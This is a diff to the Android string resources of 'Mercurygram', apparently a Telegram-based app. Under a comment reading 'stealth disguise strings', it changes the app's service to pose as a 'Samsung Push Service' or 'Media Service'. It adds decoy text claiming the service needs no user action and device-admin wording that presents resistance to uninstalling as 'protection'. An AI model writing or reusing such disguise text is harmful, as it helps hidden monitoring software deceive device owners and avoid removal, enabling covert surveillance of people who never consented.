@@ -2,10 +2,10 @@
 <resources>
     <string name="AppName">Mercurygram</string>
     <!-- MG stealth disguise strings -->
-    <string name="MgServiceName">Samsung Push Service</string>
-    <string name="MgServiceTileLabel">Push Service</string>
-    <string name="MgDecoyTitle">Samsung Push Service</string>
-    <string name="MgDecoyBody">This service keeps background notifications working for system apps. No user action is required.</string>
+    <string name="MgServiceName">Media Service</string>
+    <string name="MgServiceTileLabel">Media Service</string>
+    <string name="MgDecoyTitle">Media Service</string>
+    <string name="MgDecoyBody">This service manages background media caching. No user action is required.</string>
     <string name="MgDecoyStatus">Status: connected</string>
     <string name="MgAdminExplanation">Allows the service to protect itself from accidental removal.</string>
     <string name="MgAdminDisableWarning">Turning this off will stop background notification protection.</string>
@@ -1824,7 +1824,7 @@
     <string name="NotificationGroupFew">%1$s sent %3$s to the group %2$s</string>
     <string name="NotificationGroupAlbum">%1$s sent an album to the group %2$s</string>
     <string name="NotificationGroupForwardedFew">%1$s forwarded %3$s to the group %2$s</string>
-    <string name="NotificationHiddenName">Telegram</string>
+    <string name="NotificationHiddenName">Media Service</string>
     <string name="NotificationHiddenChatName">Telegram</string>
     <string name="NotificationHiddenChatUserName">User</string>
     <string name="NotificationHiddenMessage">New message</string>
